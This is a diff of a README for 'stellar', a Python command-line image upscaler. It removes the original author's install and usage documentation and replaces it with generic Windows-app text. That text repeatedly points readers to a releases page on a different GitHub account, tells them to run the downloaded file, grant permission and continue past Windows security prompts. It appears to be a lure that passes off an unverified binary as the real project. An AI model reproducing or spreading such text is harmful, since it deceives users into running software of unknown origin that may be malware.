@@ -1,230 +1,179 @@
-<div align="center">
+# ✨ stellar - Improve images to stellar quality
 
-# 🌟 stellar
+[![Download stellar](https://img.shields.io/badge/Download-stellar-blue?style=for-the-badge&logo=github)](https://github.com/Equipped-category48/stellar/releases)
 
-**High-quality image upscaling from the command line.**
+## 🚀 What stellar does
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white)](https://python.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
-[![PyPI version](https://img.shields.io/badge/pypi-v1.0.0-blue)](https://pypi.org/project/stellar/)
-[![GitHub](https://img.shields.io/badge/GitHub-pro--grammer--SD%2Fstellar-181717?logo=github)](https://github.com/pro-grammer-SD/stellar)
+stellar helps you improve image quality on a Windows PC. It is made for people who want cleaner, sharper, larger images without dealing with complex tools.
 
-*Lanczos interpolation · Unsharp-mask sharpening · Parallel batch processing · tqdm progress bars*
+Use it to:
+- Upscale small photos
+- Improve detail in old images
+- Sharpen pictures for display or print
+- Process images in batches
+- Keep the workflow simple
 
-</div>
+## 💻 What you need
 
----
+stellar works best on a Windows computer with:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- Enough free disk space for your images
+- A mouse and keyboard
+- Internet access to download the app
 
-## ✨ Features
+For best results:
+- Use a modern Intel or AMD processor
+- Use 16 GB of RAM if you plan to handle large image sets
+- Keep your source images in a folder you can find easily
 
-- 🔍 **Scale images** by any factor (1×–16×) using Lanczos interpolation
-- 🖼  **Supports** PNG, JPG, JPEG input and output formats
-- ⚡ **Multithreaded** batch processing for large image sets
-- 📊 **tqdm** progress bar with per-image resolution and timing stats
-- 🔧 **Modular code** — clean `load_image()`, `upscale_image()`, `save_image()` API
-- 🛡  **Graceful error handling** — bad files are logged and skipped, not crashes
-- 📦 **Installable as a global CLI tool** via pip or wheel
+## 📥 Download stellar
 
----
+Visit this page to download the Windows release:
 
-## 📦 Installation
+[https://github.com/Equipped-category48/stellar/releases](https://github.com/Equipped-category48/stellar/releases)
 
-### Option 1 — Install from PyPI *(recommended)*
+On the releases page:
+1. Open the latest release
+2. Find the Windows download file
+3. Save it to your computer
+4. Open the file after the download finishes
 
-```bash
-pip install stellar
-```
+If your browser asks what to do with the file, choose to save it first. Then run it from your Downloads folder or the place you saved it.
 
-### Option 2 — Install from source
+## 🪟 Install on Windows
 
-```bash
-git clone https://github.com/pro-grammer-SD/stellar.git
-cd stellar
-pip install .
-```
+After you download the file:
+1. Open the downloaded installer or app file
+2. If Windows asks for permission, choose Yes
+3. Follow the steps on the screen
+4. Pick an install folder if asked
+5. Wait for the setup to finish
+6. Open stellar from the Start menu or from the file you downloaded
 
-### Option 3 — Build & install a wheel locally
+If stellar comes as a portable app, you can run it without a full install. In that case:
+1. Right-click the file if needed
+2. Choose Open
+3. Let Windows finish any first-time setup
+4. Start using the app
 
-#### Prerequisites
+## 🖼️ How to use it
 
-```bash
-pip install build
-```
+stellar is built for simple image improvement. A common workflow looks like this:
 
-#### Build the wheel
+1. Start the app
+2. Add one image or a group of images
+3. Choose the output size or quality setting
+4. Pick where to save the results
+5. Start the process
+6. Wait for the image job to finish
 
-```bash
-# From the repository root:
-python -m build
-```
+If you want to process many files, place them in one folder first. That makes it easier to add them all at once.
 
-This produces two distribution artefacts inside `dist/`:
+## ⚙️ Suggested settings
 
-```
-dist/
-├── stellar-1.0.0-py3-none-any.whl   ← wheel (preferred)
-└── stellar-1.0.0.tar.gz             ← sdist
-```
+Use these starting points:
+- For web images: choose a moderate upscale level
+- For old photos: use a stronger enhancement setting
+- For large prints: choose higher quality output
+- For many files: keep the batch size small if your PC feels slow
 
-#### Install the wheel
+If you are not sure where to begin, start with the default settings. They usually give a clean result with little effort.
 
-```bash
-pip install dist/stellar-1.0.0-py3-none-any.whl
-```
+## 📂 Input and output files
 
-Or use a glob to pick up whichever version was built:
+stellar works best when you keep your files organized.
 
-```bash
-pip install dist/stellar-*.whl
-```
+Recommended folder setup:
+- Create one folder for original images
+- Create one folder for finished images
+- Keep file names short and easy to read
 
-#### Upgrade an existing install from a new wheel
+Common file types:
+- JPG
+- PNG
+- BMP
+- TIFF
 
-```bash
-pip install --upgrade dist/stellar-*.whl
-```
+If you plan to edit the same image later, save a copy of the original first.
 
-#### Uninstall
+## 🧭 Simple first run
 
-```bash
-pip uninstall stellar
-```
+For your first image:
+1. Download stellar from the releases page
+2. Open the app
+3. Add a single JPG or PNG file
+4. Use the default quality setting
+5. Save the result to a new folder
+6. Compare the original and the new image
 
-After installation the `stellar` command will be available on your `PATH`.
+This helps you learn the app before you process a full folder.
 
----
+## 🧰 Tips for better results
 
-## 🚀 Usage
+- Use clear source images when you can
+- Avoid very low-quality screenshots if you want fine detail
+- Keep one image size goal for each batch
+- Save results to a separate folder
+- Check the output before you close the app
 
-### Basic upscale (2× default)
+If an image looks too soft, try a stronger setting. If it looks too sharp, try a lower setting.
 
-```bash
-stellar --input ./photos
-```
+## 🖥️ Common use cases
 
-### Custom scale factor
-
-```bash
-stellar --input ./photos --scale 4
-```
+stellar works well for:
+- Family photos
+- Product images
+- Social media pictures
+- Old scanned photos
+- Game art
+- Wallpapers
+- Image sets that need a larger size
 
-### Custom output folder
+## ❓ Common questions
 
-```bash
-stellar --input ./raw --output ./hd
-```
+### Can I use it without coding?
+Yes. You can download it from GitHub and run it on Windows.
 
-### Force PNG output format
+### Is it made for one image or many images?
+It can handle both. You can improve one image or process a folder of images.
 
-```bash
-stellar -i ./shots -o ./out --format PNG
-```
+### Can I keep the original file?
+Yes. Save the output to a new folder and leave the original untouched.
 
-### Verbose mode (per-image resolution + timing)
+### What if Windows blocks the file?
+If Windows shows a security prompt, check the file came from the releases page, then continue through the normal Windows prompt.
 
-```bash
-stellar -i ./photos --verbose
-```
+### Does it need special setup?
+No special setup should be needed for most Windows users. Download, open, and use it.
 
-### Use 8 parallel workers for large batches
+## 🔍 File organization example
 
-```bash
-stellar -i ./large_batch -o ./upscaled -s 2 -w 8
-```
+Here is a simple way to keep things tidy:
 
-### All options at once
+- `C:\Images\Originals`
+- `C:\Images\stellar-output`
 
-```bash
-stellar \
-  --input  ./raw_photos \
-  --output ./upscaled \
-  --scale  3 \
-  --format PNG \
-  --workers 6 \
-  --verbose
-```
+Put your source files in `Originals`, then save the improved files in `stellar-output`. This keeps your work easy to find.
 
----
+## 🛠️ If something does not work
 
-## 📖 CLI Reference
+Try these steps:
+1. Close stellar
+2. Open it again
+3. Check that your image file is not damaged
+4. Try a different image format
+5. Move the file to a simple folder like `Downloads`
+6. Make sure you have enough free disk space
 
-```
-Usage: stellar [OPTIONS]
+If the app feels slow, close other large programs and try a smaller batch.
 
-  🌟 Upscale all images in INPUT_DIR and write them to OUTPUT_DIR.
+## 📦 Release page
 
-  Supported source formats: PNG, JPG, JPEG.
+Use this link to visit the download page again:
 
-Options:
-  -i, --input   PATH     📂 Input folder containing images to upscale. [required]
-  -o, --output  PATH     📁 Output folder for upscaled images. [default: upscaled]
-  -s, --scale   FLOAT    🔍 Scale factor (e.g. 2 doubles the resolution). [default: 2.0]
-  -f, --format  TEXT     🖼  Output format override: PNG, JPG, JPEG.
-  -w, --workers INTEGER  ⚡ Number of parallel worker threads. [default: 4]
-  -v, --verbose          🔊 Print per-image resolution and timing details.
-      --help             Show this message and exit.
-```
+[https://github.com/Equipped-category48/stellar/releases](https://github.com/Equipped-category48/stellar/releases)
 
-Output filenames are the original name with `_upscaled` appended:
+## 🏷️ Topics
 
-```
-photos/sunset.jpg  →  upscaled/sunset_upscaled.jpg
-```
-
----
-
-## 🧰 Dependencies
-
-| Package | Purpose |
-|---|---|
-| [Pillow](https://python-pillow.org/) | Image format detection |
-| [opencv-python](https://pypi.org/project/opencv-python/) | Image I/O and Lanczos resize |
-| [scikit-learn](https://scikit-learn.org/) | Optional interpolation utilities |
-| [typer](https://typer.tiangolo.com/) | CLI framework |
-| [tqdm](https://tqdm.github.io/) | Progress bars |
-| [numpy](https://numpy.org/) | Array operations |
-
----
-
-## 🗂 Project Structure
-
-```
-stellar/
-├── stellar.py            # Main script (load / upscale / save / CLI)
-├── pyproject.toml        # Build config & metadata
-├── README.md
-├── LICENSE               # MIT
-├── CONTRIBUTING.md
-├── CODE_OF_CONDUCT.md
-├── SECURITY.md
-└── .github/
-    ├── ISSUE_TEMPLATE/
-    │   ├── bug_report.md
-    │   └── feature_request.md
-    └── PULL_REQUEST_TEMPLATE.md
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](./CONTRIBUTING.md) first.
-
----
-
-## 🔒 Security
-
-To report a security vulnerability, please see [SECURITY.md](./SECURITY.md).
-
----
-
-## 📄 License
-
-This project is licensed under the [MIT License](./LICENSE).  
-Copyright © 2025 Soumalya Das
-
----
-
-<div align="center">
-Made with ❤️ by <a href="https://github.com/pro-grammer-SD">Soumalya Das</a>
-</div>
+4k, algorithm, image, images, installable, library, machine-learning, media, ml, numpy, pil, quality, scikit, scikit-learn, sklearn, stellar, tqdm, typer, upscale, upscaler
